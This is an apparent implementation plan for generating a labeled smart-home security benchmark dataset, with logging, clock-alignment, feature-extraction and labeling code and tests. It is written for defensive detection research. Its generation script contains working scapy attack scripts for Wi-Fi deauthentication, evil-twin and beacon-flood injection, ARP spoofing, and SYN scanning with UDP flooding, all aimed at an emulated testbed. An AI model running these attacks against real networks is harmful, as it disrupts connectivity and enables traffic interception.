# VESPER-SH Dataset Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Produce VESPER-SH — a labeled, multi-modal (activity + device + network) smart-home security benchmark dataset with benign + 5 attack classes, cross-environment splits, and IsolationForest + RandomForest baselines.

**Architecture:** Instrument the existing coupled testbed to emit epoch-timestamped events (Mac eval) + an attack schedule and dual-vantage pcaps (Multipass VM). A Mac-side exporter clock-aligns the streams, cuts 1 s windows, extracts 3 modality feature blocks, and writes per-episode `windows.parquet` + `labels.csv`. A loader + splits + baseline detectors turn it into a benchmark. Then package (datasheet/README) and add paper section C4.

**Tech Stack:** Python 3 (vesper conda env), numpy, pandas, pyarrow, scikit-learn, scapy, tshark (Wireshark 4.6, Mac), Habitat 3.0, Multipass VM (mac80211_hwsim + wmediumd + hostapd), LaTeX (IEEEtran).

## Global Constraints

- Double-blind: **no author identity** anywhere in the paper body or released artifact (no names, institution, ORCID, VM usernames).
- `paper-latex/` and `.env` (secrets) **never** committed to GitHub.
- Firmware is **simulated**; Wi-Fi is **emulated**; single-station LAN emulation — stated honestly in datasheet + paper.
- Network is **one modality block** — no added networking-method claims.
- Exporter/baselines run in the **vesper conda env on the Mac**: `~/miniconda3/envs/vesper/bin/python`.
- Mac eval is native (conda `vesper`); attackable Wi-Fi is in Multipass VM `vesper-vm`; bridge = TCP VM:6000; coupling gated by `VESPER_WIFI_VM`; dataset logging gated by `VESPER_DATASET_OUT`.
- Canonical clock = Mac; VM timestamps mapped via `t_canon = t_vm − offset`, `offset = median(vm_ts − mac_ts)`.
- Attack classes (exact strings): `deauth`, `evil_twin`, `beacon_flood`, `arp_spoof`, `lan_scan`. Benign label: `benign`.
- Dataset root: `results/vesper_sh/`. Package staging: `dist/vesper-sh/`.

---

## Phase 0 — Dependencies

### Task 0: Install exporter/baseline dependencies

**Files:**
- Modify: none (environment only)

**Interfaces:**
- Produces: `pandas`, `pyarrow` importable in the vesper env (parquet I/O for all later tasks).

- [ ] **Step 1: Check current state**

Run: `~/miniconda3/envs/vesper/bin/python -c "import pandas, pyarrow" 2>&1 || echo MISSING`
Expected: `MISSING`

- [ ] **Step 2: Install**

Run: `~/miniconda3/envs/vesper/bin/pip install "pandas>=2.0" "pyarrow>=14"`
Expected: successful install.

- [ ] **Step 3: Verify**

Run: `~/miniconda3/envs/vesper/bin/python -c "import pandas,pyarrow,sklearn,numpy,scapy;print('ok')"`
Expected: `ok`

- [ ] **Step 4: Commit** (record the dep addition in a requirements file)

```bash
printf "pandas>=2.0\npyarrow>=14\nscikit-learn>=1.6\nnumpy>=1.26\n" > scripts/dataset/requirements.txt
git add scripts/dataset/requirements.txt
git commit -m "chore(vesper-sh): pin dataset exporter/baseline deps"
```

---

## Phase 1 — Structured Logging (instrument the testbed)

### Task 1: Mac-side dataset event logger + episode context

**Files:**
- Create: `scripts/dataset/__init__.py` (empty)
- Create: `scripts/dataset/event_log.py`
- Modify: `scripts/run_autonomous_eval.py` (add logger attach near the WiFi-VM hook at ~5599; set episode context at the scene/model boundaries)
- Test: `tests/dataset/test_event_log.py`

**Interfaces:**
- Produces:
  - `event_log.DatasetEventLogger(out_dir)` with `.set_context(home, model, run)`, `.log(ev)`, `.close()`.
  - Writes `<out_dir>/events.jsonl`, one JSON object per line:
    `{"ts": float, "home": str, "model": str, "run": int, "event_type": str, "room": str, "device": str}`.
  - Writes `<out_dir>/bridge_sync_mac.jsonl` lines `{"mac_ts": float, "seq": int, "device": str, "state": str, "room": str}` for each forwarded bridge event (consumed by Task 5 clock-sync).

- [ ] **Step 1: Write the failing test**

```python
# tests/dataset/test_event_log.py
import json, os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
from dataset.event_log import DatasetEventLogger

class _Ev:
    def __init__(self, et, room=None, src=None):
        self.event_type = et; self.payload = {"room": room} if room else {}; self.source_id = src

def test_logs_event_with_context(tmp_path):
    log = DatasetEventLogger(str(tmp_path))
    log.set_context("102343992", "qwen2.5-7b-instruct", 1)
    log.log(_Ev("motion_detected", room="bedroom.004", src="motion_1"))
    log.close()
    lines = (tmp_path / "events.jsonl").read_text().strip().splitlines()
    assert len(lines) == 1
    rec = json.loads(lines[0])
    assert rec["home"] == "102343992" and rec["model"] == "qwen2.5-7b-instruct"
    assert rec["run"] == 1 and rec["event_type"] == "motion_detected"
    assert rec["room"] == "bedroom.004" and rec["device"] == "motion_1"
    assert isinstance(rec["ts"], float) and rec["ts"] > 0

def test_bridge_sync_line(tmp_path):
    log = DatasetEventLogger(str(tmp_path))
    log.set_context("h", "m", 1)
    log.log_bridge_sync(seq=7, device="d", state="motion_detected", room="kitchen")
    log.close()
    rec = json.loads((tmp_path / "bridge_sync_mac.jsonl").read_text().strip())
    assert rec["seq"] == 7 and rec["room"] == "kitchen" and isinstance(rec["mac_ts"], float)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_event_log.py -v`
Expected: FAIL (`ModuleNotFoundError: No module named 'dataset.event_log'`).

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/dataset/event_log.py
"""Append-only JSONL logger for the VESPER-SH dataset (Mac-side, canonical clock)."""
import json, os, threading, time

class DatasetEventLogger:
    def __init__(self, out_dir: str):
        os.makedirs(out_dir, exist_ok=True)
        self._ev = open(os.path.join(out_dir, "events.jsonl"), "a", buffering=1)
        self._sy = open(os.path.join(out_dir, "bridge_sync_mac.jsonl"), "a", buffering=1)
        self._ctx = {"home": "unknown", "model": "unknown", "run": 0}
        self._lock = threading.Lock()

    def set_context(self, home: str, model: str, run: int) -> None:
        with self._lock:
            self._ctx = {"home": home, "model": model, "run": int(run)}

    def log(self, ev) -> None:
        try:
            payload = getattr(ev, "payload", None) or {}
            rec = {"ts": time.time(), **self._ctx,
                   "event_type": getattr(ev, "event_type", ""),
                   "room": payload.get("room", ""),
                   "device": getattr(ev, "source_id", None) or getattr(ev, "event_type", "")}
            with self._lock:
                self._ev.write(json.dumps(rec) + "\n")
        except Exception:
            pass

    def log_bridge_sync(self, seq: int, device: str, state: str, room: str) -> None:
        try:
            rec = {"mac_ts": time.time(), "seq": int(seq), "device": device,
                   "state": state, "room": room}
            with self._lock:
                self._sy.write(json.dumps(rec) + "\n")
        except Exception:
            pass

    def close(self) -> None:
        for f in (self._ev, self._sy):
            try: f.close()
            except Exception: pass
```

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_event_log.py -v`
Expected: PASS (2 passed). Also create empty `scripts/dataset/__init__.py`.

- [ ] **Step 5: Wire into `run_autonomous_eval.py`**

At the top of `main()`'s demo-setup region (right BEFORE the `if _wifi_vm ...` block at ~5598), add the dataset logger attach:

```python
    # ---- VESPER-SH DATASET LOGGING (gated) ----
    _ds_out = os.environ.get("VESPER_DATASET_OUT")
    demo._ds_logger = None
    if _ds_out:
        try:
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), "dataset"))
            from dataset.event_log import DatasetEventLogger
            demo._ds_logger = DatasetEventLogger(_ds_out)
            _ds_buses = []
            _vint2 = getattr(demo, "vesper", None)
            if _vint2 is not None and getattr(_vint2, "_event_bus", None) is not None:
                _ds_buses.append(_vint2._event_bus)
            _sb2 = getattr(demo, "sensor_event_bus", None)
            if _sb2 is not None and _sb2 not in _ds_buses:
                _ds_buses.append(_sb2)
            def _ds_forward(ev):
                # stamp current episode from the integration's live scene_id
                _h = getattr(getattr(demo, "vesper", None), "scene_id", "unknown")
                demo._ds_logger._ctx["home"] = _h or "unknown"
                demo._ds_logger.log(ev)
            for _b in _ds_buses:
                _b.subscribe("*", _ds_forward)
            logger.info(f"[VESPER-SH] dataset event logging -> {_ds_out} on {len(_ds_buses)} bus(es)")
        except Exception as _e:
            logger.warning(f"[VESPER-SH] dataset logging disabled ({_e})")
```

Then set model/run context once per model. Locate the model-loop log line (grep `🧠 MODEL` or `MODEL {`/`model_name`); immediately after the current model name is known, add:

```python
            if getattr(demo, "_ds_logger", None):
                demo._ds_logger.set_context(getattr(getattr(demo, "vesper", None), "scene_id", "unknown"),
                                            model_name, int(os.environ.get("VESPER_DATASET_RUN", "1")))
```

In the existing `_wifi_forward(ev)` (line ~5615), add a per-event sequence + bridge-sync log so clock-sync has matched pairs. Replace the body with:

```python
            _seq = {"n": 0}
            def _wifi_forward(ev):
                try:
                    if ev.event_type in _WIFI_EVTS:
                        payload = ev.payload or {}
                        _seq["n"] += 1
                        _dev = ev.source_id or ev.event_type
                        _room = payload.get("room", "")
                        msg = _json.dumps({"device": _dev, "state": ev.event_type,
                                           "room": _room, "seq": _seq["n"]}) + "\n"
                        _wconn.sendall(msg.encode())
                        if getattr(demo, "_ds_logger", None):
                            demo._ds_logger.log_bridge_sync(_seq["n"], _dev, ev.event_type, _room)
                except Exception:
                    pass
```

- [ ] **Step 6: Verify the wiring imports cleanly**

Run: `~/miniconda3/envs/vesper/bin/python -c "import ast; ast.parse(open('scripts/run_autonomous_eval.py').read()); print('parse ok')"`
Expected: `parse ok`

- [ ] **Step 7: Commit**

```bash
git add scripts/dataset/__init__.py scripts/dataset/event_log.py tests/dataset/test_event_log.py scripts/run_autonomous_eval.py
git commit -m "feat(vesper-sh): Mac-side dataset event logger + bridge-sync + episode context"
```

### Task 2: VM agent — timestamped tx sync log

**Files:**
- Modify: `scripts/vm_device_agent.py`
- Test: `tests/dataset/test_agent_sync.py`

**Interfaces:**
- Consumes: forwarded JSON now includes `seq` (from Task 1).
- Produces: when `--sync-log PATH` is set, the agent appends `{"vm_ts": float, "seq": int, "device": str, "state": str, "room": str}` per received event → `bridge_sync_vm.jsonl` (consumed by Task 5).

- [ ] **Step 1: Write the failing test**

```python
# tests/dataset/test_agent_sync.py
import json, os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
import vm_device_agent as A

def test_sync_record_shape(tmp_path):
    p = tmp_path / "bridge_sync_vm.jsonl"
    A.write_sync(str(p), {"device": "d", "state": "motion_detected", "room": "kitchen", "seq": 3})
    rec = json.loads(p.read_text().strip())
    assert rec["seq"] == 3 and rec["device"] == "d" and rec["room"] == "kitchen"
    assert isinstance(rec["vm_ts"], float) and rec["vm_ts"] > 0
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_agent_sync.py -v`
Expected: FAIL (`AttributeError: module 'vm_device_agent' has no attribute 'write_sync'`).

- [ ] **Step 3: Write minimal implementation** — add to `scripts/vm_device_agent.py` above `main()`:

```python
import time

def write_sync(path: str, ev: dict) -> None:
    """Append a clock-sync record (VM clock) for a received bridge event."""
    rec = {"vm_ts": time.time(), "seq": int(ev.get("seq", -1)),
           "device": ev.get("device", "?"), "state": ev.get("state", "?"),
           "room": ev.get("room", "?")}
    with open(path, "a", buffering=1) as f:
        f.write(json.dumps(rec) + "\n")
```

Add `--sync-log` arg in `main()` (after the other `add_argument` calls):

```python
    ap.add_argument("--sync-log", default=None)
```

In `handle(conn)`, right after `ev = json.loads(line)` succeeds and before building `msg`, add:

```python
                if args.sync_log and isinstance(ev, dict):
                    try: write_sync(args.sync_log, ev)
                    except Exception: pass
```

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_agent_sync.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add scripts/vm_device_agent.py tests/dataset/test_agent_sync.py
git commit -m "feat(vesper-sh): VM agent timestamped bridge-sync log"
```

---

## Phase 2 — Generation-Run Script

### Task 3: Dataset generation runner (dual-vantage capture + scheduled 5-attack suite)

**Files:**
- Create: `scripts/vm_dataset_gen.sh` (VM-side: continuous capture + scheduled attacks + schedule log)
- Create: `scripts/dataset/gen_run.md` (runbook: how Mac eval + VM runner are launched together)
- Test: manual smoke (needs the VM); assertion script `scripts/dataset/check_episode.sh`

**Interfaces:**
- Consumes: attackable Wi-Fi up (`vm_wifi_net.sh`), agent up with `--sync-log`.
- Produces per episode under `$OUT`: `ap.pcap`, `rf.pcap`, `attack_schedule.jsonl`
  (lines `{"class": str, "round": int, "start_ts": float, "end_ts": float}` VM clock), `agent.log`, `bridge_sync_vm.jsonl`.

- [ ] **Step 1: Write the generation script**

```bash
# scripts/vm_dataset_gen.sh
#!/usr/bin/env bash
# VM-side VESPER-SH generation: continuous dual-vantage capture (wlan0 ap.pcap +
# wlan2 monitor rf.pcap) for DURATION, injecting the 5-attack suite on a schedule
# with benign gaps. Records exact attack windows (VM clock) to attack_schedule.jsonl.
# Assumes vm_wifi_net.sh is up and vm_device_agent.py runs with --sync-log.
set -uo pipefail
OUT="${1:-/tmp/vsh_episode}"; DUR="${2:-600}"; CH=6
mkdir -p "$OUT"; : > "$OUT/attack_schedule.jsonl"
log(){ echo "[vsh $(date +%T)] $*"; }
AP=$(iw dev wlan0 info | awk '/addr/{print $2}')
STA=$(ip netns exec ns-sta1 iw dev wlan1 info | awk '/addr/{print $2}')

# continuous captures for the whole episode
ip link set wlan2 down; iw dev wlan2 set type monitor; ip link set wlan2 up; iw dev wlan2 set channel $CH
tshark -i wlan0 -w "$OUT/ap.pcap" -a duration:$DUR >/dev/null 2>&1 & AP_TS=$!
tshark -i wlan2 -w "$OUT/rf.pcap" -a duration:$DUR >/dev/null 2>&1 & RF_TS=$!
log "capturing ${DUR}s: ap.pcap(wlan0) rf.pcap(wlan2)  AP=$AP STA=$STA"

# attack scripts (RF from wlan2; LAN from ns-sta1 real MAC)
cat > "$OUT/a_deauth.py" <<PY
from scapy.all import RadioTap,Dot11,Dot11Deauth,sendp
for _ in range(20): sendp([RadioTap()/Dot11(addr1="$STA",addr2="$AP",addr3="$AP")/Dot11Deauth(reason=7)],iface="wlan2",verbose=False)
PY
cat > "$OUT/a_evil_twin.py" <<PY
from scapy.all import RadioTap,Dot11,Dot11Beacon,Dot11Elt,sendp
import time;t=time.time()
while time.time()-t<5:
    sendp(RadioTap()/Dot11(type=0,subtype=8,addr1="ff:ff:ff:ff:ff:ff",addr2="02:00:00:00:aa:00",addr3="02:00:00:00:aa:00")/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="VESPER-IoT-Network"),iface="wlan2",verbose=False);time.sleep(0.03)
PY
cat > "$OUT/a_beacon_flood.py" <<PY
from scapy.all import RadioTap,Dot11,Dot11Beacon,Dot11Elt,sendp,RandMAC
import time;t=time.time()
while time.time()-t<5:
    for n in range(10):
        m=str(RandMAC());sendp(RadioTap()/Dot11(type=0,subtype=8,addr1="ff:ff:ff:ff:ff:ff",addr2=m,addr3=m)/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="Free-WiFi-%d"%n),iface="wlan2",verbose=False)
    time.sleep(0.05)
PY
cat > "$OUT/a_arp_spoof.py" <<PY
from scapy.all import Ether,ARP,sendp
import time;t=time.time()
while time.time()-t<5:
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,psrc="10.0.0.1",pdst="10.0.0.20",hwsrc="02:00:00:00:99:00"),iface="wlan1",verbose=False);time.sleep(0.2)
PY
# lan_scan: SYN scan + UDP flood from the station's REAL MAC to the hub (propagates through AP)
cat > "$OUT/a_lan_scan.py" <<PY
from scapy.all import IP,TCP,UDP,sr1,send
import time
for p in list(range(1,200))+[1883,8080,554,80,443,22,23]:
    try: send(IP(dst="10.0.0.1")/TCP(dport=p,flags="S"),verbose=False)
    except Exception: pass
t=time.time()
while time.time()-t<3:
    send(IP(dst="10.0.0.1")/UDP(dport=1883)/(b"x"*200),verbose=False)
PY

ATTACKS=(deauth evil_twin beacon_flood arp_spoof lan_scan)
END=$(( $(date +%s) + DUR - 20 )); ROUND=0
sleep 20   # benign warm-up
while [ $(date +%s) -lt $END ]; do
  ROUND=$((ROUND+1)); A=${ATTACKS[$(( (ROUND-1) % ${#ATTACKS[@]} ))]}
  S=$(date +%s.%N)
  case "$A" in
    deauth|evil_twin|beacon_flood) python3 "$OUT/a_${A}.py" 2>/dev/null || true ;;
    arp_spoof|lan_scan) ip netns exec ns-sta1 python3 "$OUT/a_${A}.py" 2>/dev/null || true ;;
  esac
  E=$(date +%s.%N)
  echo "{\"class\":\"$A\",\"round\":$ROUND,\"start_ts\":$S,\"end_ts\":$E}" >> "$OUT/attack_schedule.jsonl"
  log "round $ROUND [$A] $S..$E"
  sleep 40   # benign gap (benign-dominant)
done
wait $AP_TS 2>/dev/null || true; wait $RF_TS 2>/dev/null || true
: > "$OUT/DONE"; log "episode done: $ROUND attack rounds"
```

- [ ] **Step 2: Write the per-episode assertion helper**

```bash
# scripts/dataset/check_episode.sh
#!/usr/bin/env bash
# Assert an episode capture is well-formed. Usage: check_episode.sh <episode_dir>
set -uo pipefail
D="$1"; ok=1
for f in ap.pcap rf.pcap attack_schedule.jsonl; do
  [ -s "$D/$f" ] || { echo "MISSING/empty: $f"; ok=0; }
done
rf_deauth=$(tshark -r "$D/rf.pcap" -Y "wlan.fc.type_subtype==0x000c" 2>/dev/null | wc -l|tr -d ' ')
ap_arp=$(tshark -r "$D/ap.pcap" -Y "arp" 2>/dev/null | wc -l|tr -d ' ')
sched=$(wc -l < "$D/attack_schedule.jsonl" 2>/dev/null|tr -d ' ')
echo "rf deauth=$rf_deauth  ap arp=$ap_arp  scheduled rounds=$sched"
[ "$rf_deauth" -gt 0 ] && [ "$ap_arp" -gt 0 ] && [ "$sched" -ge 5 ] || ok=0
[ $ok -eq 1 ] && echo "EPISODE OK" || { echo "EPISODE INCOMPLETE"; exit 1; }
```

- [ ] **Step 3: Smoke test one episode (needs VM up)**

Run (Mac). NOTE: the smoke test needs NO agent (no Mac eval driving events), so it
avoids the pkill-self-kill pitfall (`pkill -f vm_device_agent` inside a `bash -c` that
contains the agent path matches and kills the block itself). Net must already be up.
```bash
multipass transfer scripts/vm_dataset_gen.sh scripts/dataset/check_episode.sh vesper-vm:/tmp/
multipass exec vesper-vm -- sudo bash -c 'killall tshark 2>/dev/null; sleep 1; \
  mkdir -p /tmp/vsh_ep; rm -f /tmp/vsh_ep/*; \
  bash /tmp/vm_dataset_gen.sh /tmp/vsh_ep 280; \
  bash /tmp/check_episode.sh /tmp/vsh_ep'
```
Expected: `EPISODE OK` (rf deauth>0, ap arp>0, scheduled rounds≥5). `280`s covers ~6
attack rounds (20s warm-up + ~45s/round). For Task 12's coupled run, free the agent
port with `fuser -k 6000/tcp` (never pattern-pkill).

- [ ] **Step 4: Commit**

```bash
git add scripts/vm_dataset_gen.sh scripts/dataset/check_episode.sh scripts/dataset/gen_run.md
git commit -m "feat(vesper-sh): dual-vantage generation runner + scheduled 5-attack suite"
```

---

## Phase 3 — Exporter (raw → windows + labels)

### Task 4: Clock alignment

**Files:**
- Create: `scripts/dataset/clock_sync.py`
- Test: `tests/dataset/test_clock_sync.py`

**Interfaces:**
- Produces: `clock_sync.compute_offset(mac_sync_path, vm_sync_path) -> float` = `median(vm_ts − mac_ts)` over `seq`-matched pairs; raises `ValueError` if <1 match. `clock_sync.to_canonical(t_vm, offset) -> float` = `t_vm − offset`.

- [ ] **Step 1: Write the failing test**

```python
# tests/dataset/test_clock_sync.py
import json, os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
from dataset.clock_sync import compute_offset, to_canonical

def _w(p, rows):
    with open(p, "w") as f:
        for r in rows: f.write(json.dumps(r) + "\n")

def test_offset_is_median_of_matched(tmp_path):
    mac = tmp_path/"m.jsonl"; vm = tmp_path/"v.jsonl"
    _w(mac, [{"mac_ts":100.0,"seq":1},{"mac_ts":101.0,"seq":2},{"mac_ts":102.0,"seq":3}])
    _w(vm,  [{"vm_ts":150.0,"seq":1},{"vm_ts":151.5,"seq":2},{"vm_ts":152.0,"seq":3}])  # offsets 50,50.5,50
    assert abs(compute_offset(str(mac), str(vm)) - 50.0) < 1e-6
    assert abs(to_canonical(152.0, 50.0) - 102.0) < 1e-6

def test_raises_without_matches(tmp_path):
    mac = tmp_path/"m.jsonl"; vm = tmp_path/"v.jsonl"
    _w(mac, [{"mac_ts":1.0,"seq":1}]); _w(vm, [{"vm_ts":9.0,"seq":99}])
    import pytest
    with pytest.raises(ValueError): compute_offset(str(mac), str(vm))
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_clock_sync.py -v`
Expected: FAIL (no module `dataset.clock_sync`).

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/dataset/clock_sync.py
"""Align VM clock to the canonical Mac clock via seq-matched bridge events."""
import json
from statistics import median

def _load(path, ts_key):
    out = {}
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line: continue
            try: r = json.loads(line)
            except Exception: continue
            if "seq" in r and ts_key in r: out[int(r["seq"])] = float(r[ts_key])
    return out

def compute_offset(mac_sync_path: str, vm_sync_path: str) -> float:
    mac = _load(mac_sync_path, "mac_ts"); vm = _load(vm_sync_path, "vm_ts")
    diffs = [vm[s] - mac[s] for s in mac.keys() & vm.keys()]
    if not diffs: raise ValueError("no seq-matched bridge events for clock sync")
    return float(median(diffs))

def to_canonical(t_vm: float, offset: float) -> float:
    return float(t_vm) - float(offset)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_clock_sync.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add scripts/dataset/clock_sync.py tests/dataset/test_clock_sync.py
git commit -m "feat(vesper-sh): bridge-event clock alignment"
```

### Task 5: Network feature extraction from pcaps (tshark)

**Files:**
- Create: `scripts/dataset/net_features.py`
- Test: `tests/dataset/test_net_features.py`

**Interfaces:**
- Produces: `net_features.parse_pcap(path, kind) -> list[dict]` where `kind in {"rf","ap"}`; each dict `{ts: float, ...}` per frame. `net_features.window_net(frames_rf, frames_ap, t0, t1, offset) -> dict` returns the network feature block for one 1 s window keyed:
  `net_total, net_mgmt, net_data, net_beacon, net_deauth, net_probe, net_disassoc, net_arp, net_dhcp, net_unique_src, net_bytes, net_syn, net_unique_dports`.

- [ ] **Step 1: Write the failing test** (uses a crafted pcap built with scapy — no VM needed)

```python
# tests/dataset/test_net_features.py
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
from dataset.net_features import parse_pcap, window_net
from scapy.all import wrpcap, RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Ether, ARP

def test_rf_parse_and_window(tmp_path):
    p = str(tmp_path/"rf.pcap")
    pkts = [RadioTap()/Dot11(type=0,subtype=12,addr1="a",addr2="b",addr3="b")/Dot11Deauth() for _ in range(3)]
    pkts += [RadioTap()/Dot11(type=0,subtype=8,addr1="a",addr2="b",addr3="b")/Dot11Beacon()]
    wrpcap(p, pkts)
    frames = parse_pcap(p, "rf")
    assert len(frames) == 4
    t0 = min(f["ts"] for f in frames); w = window_net(frames, [], t0, t0+3600, 0.0)
    assert w["net_deauth"] == 3 and w["net_beacon"] == 1

def test_ap_parse_arp(tmp_path):
    p = str(tmp_path/"ap.pcap")
    wrpcap(p, [Ether()/ARP(op=2) for _ in range(5)])
    frames = parse_pcap(p, "ap")
    t0 = min(f["ts"] for f in frames); w = window_net([], frames, t0, t0+3600, 0.0)
    assert w["net_arp"] == 5
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_net_features.py -v`
Expected: FAIL (no module).

- [ ] **Step 3: Write minimal implementation** (tshark field extraction; robust to both link types)

```python
# scripts/dataset/net_features.py
"""Per-frame parse (via tshark) + per-window network feature block."""
import subprocess

_RF_FIELDS = ["frame.time_epoch","wlan.fc.type","wlan.fc.type_subtype","wlan.sa","frame.len"]
_AP_FIELDS = ["frame.time_epoch","arp","bootp.type","eth.src","ip.proto","tcp.flags.syn","tcp.dstport","frame.len"]

def _tshark(path, fields):
    cmd = ["tshark","-r",path,"-T","fields"] + sum([["-e",f] for f in fields], [])
    out = subprocess.run(cmd, capture_output=True, text=True).stdout
    return [line.split("\t") for line in out.splitlines() if line.strip()]

def parse_pcap(path, kind):
    frames = []
    if kind == "rf":
        for r in _tshark(path, _RF_FIELDS):
            r = (r + [""]*5)[:5]
            try: ts = float(r[0])
            except Exception: continue
            frames.append({"ts": ts, "subtype": r[2], "sa": r[3],
                           "len": int(r[4]) if r[4].isdigit() else 0})
    else:
        for r in _tshark(path, _AP_FIELDS):
            r = (r + [""]*8)[:8]
            try: ts = float(r[0])
            except Exception: continue
            frames.append({"ts": ts, "arp": bool(r[1]), "dhcp": r[2] != "",
                           "src": r[3], "syn": r[5] in ("1","True"),
                           "dport": r[6], "len": int(r[7]) if r[7].isdigit() else 0})
    return frames

def window_net(frames_rf, frames_ap, t0, t1, offset):
    f = lambda ts: (ts - offset)
    rf = [x for x in frames_rf if t0 <= f(x["ts"]) < t1]
    ap = [x for x in frames_ap if t0 <= f(x["ts"]) < t1]
    def cnt(xs, key): return sum(1 for x in xs if x.get("subtype") == key)
    srcs = {x.get("sa") for x in rf if x.get("sa")} | {x.get("src") for x in ap if x.get("src")}
    dports = {x["dport"] for x in ap if x.get("dport")}
    return {
        "net_total": len(rf) + len(ap),
        "net_mgmt": len(rf), "net_data": len(ap),
        "net_beacon": cnt(rf, "0x0008"), "net_deauth": cnt(rf, "0x000c"),
        "net_probe": cnt(rf, "0x0004"), "net_disassoc": cnt(rf, "0x000a"),
        "net_arp": sum(1 for x in ap if x.get("arp")),
        "net_dhcp": sum(1 for x in ap if x.get("dhcp")),
        "net_unique_src": len(srcs - {None, ""}),
        "net_bytes": sum(x.get("len", 0) for x in rf + ap),
        "net_syn": sum(1 for x in ap if x.get("syn")),
        "net_unique_dports": len(dports - {None, ""}),
    }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_net_features.py -v`
Expected: PASS (2 passed). (Note: `wlan.fc.type_subtype` renders as `0x0008` etc.; if the local tshark emits `0x0008,0x0008`, split on comma and take first — add `.split(",")[0]` in parse if the test shows it.)

- [ ] **Step 5: Commit**

```bash
git add scripts/dataset/net_features.py tests/dataset/test_net_features.py
git commit -m "feat(vesper-sh): tshark network feature extraction"
```

### Task 6: Activity + device feature extraction from events.jsonl

**Files:**
- Create: `scripts/dataset/event_features.py`
- Test: `tests/dataset/test_event_features.py`

**Interfaces:**
- Produces: `event_features.load_events(path) -> list[dict]` (parsed JSONL). `event_features.window_events(events, t0, t1) -> dict` returns activity+device blocks:
  `act_motion, act_rooms, act_transitions, act_doors, act_any, dev_state_changes, dev_tap_firings, dev_firmware_updates`.

- [ ] **Step 1: Write the failing test**

```python
# tests/dataset/test_event_features.py
import json, os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
from dataset.event_features import window_events

def test_activity_and_device_counts():
    evs = [
        {"ts":10.1,"event_type":"motion_detected","room":"kitchen"},
        {"ts":10.5,"event_type":"agent_entered_room","room":"kitchen"},
        {"ts":10.9,"event_type":"door_opened","room":"kitchen"},
        {"ts":10.7,"event_type":"device_state_changed","room":"kitchen"},
        {"ts":10.8,"event_type":"tap_fired","room":"kitchen"},
        {"ts":99.0,"event_type":"motion_detected","room":"den"},  # outside window
    ]
    w = window_events(evs, 10.0, 11.0)
    assert w["act_motion"] == 1 and w["act_doors"] == 1 and w["act_transitions"] == 1
    assert w["act_rooms"] == 1 and w["act_any"] == 1
    assert w["dev_state_changes"] == 1 and w["dev_tap_firings"] == 1
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_event_features.py -v`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/dataset/event_features.py
"""Activity + device feature blocks from the Mac-clock events.jsonl."""
import json

_MOTION = {"motion_detected"}
_TRANS = {"agent_entered_room", "agent_left_room"}
_DOOR = {"door_opened"}
_DEVCHG = {"device_state_changed", "state_change"}
_TAP = {"tap_fired"}
_FW = {"firmware_state_update"}

def load_events(path):
    out = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line: continue
            try: out.append(json.loads(line))
            except Exception: pass
    return out

def window_events(events, t0, t1):
    w = [e for e in events if t0 <= float(e.get("ts", -1)) < t1]
    rooms = {e.get("room", "") for e in w if e.get("event_type") in _MOTION | _TRANS and e.get("room")}
    def c(types): return sum(1 for e in w if e.get("event_type") in types)
    return {
        "act_motion": c(_MOTION), "act_rooms": len(rooms),
        "act_transitions": c(_TRANS), "act_doors": c(_DOOR),
        "act_any": 1 if w else 0,
        "dev_state_changes": c(_DEVCHG), "dev_tap_firings": c(_TAP),
        "dev_firmware_updates": c(_FW),
    }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_event_features.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add scripts/dataset/event_features.py tests/dataset/test_event_features.py
git commit -m "feat(vesper-sh): activity + device feature extraction"
```

### Task 7: Labeling from the attack schedule

**Files:**
- Create: `scripts/dataset/labeling.py`
- Test: `tests/dataset/test_labeling.py`

**Interfaces:**
- Produces: `labeling.load_schedule(path, offset) -> list[dict]` (start/end mapped to canonical clock). `labeling.label_window(schedule, t0, t1) -> str` = attack class if `[t0,t1)` overlaps an injection, else `"benign"` (earliest-start wins on overlap).

- [ ] **Step 1: Write the failing test**

```python
# tests/dataset/test_labeling.py
import json, os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
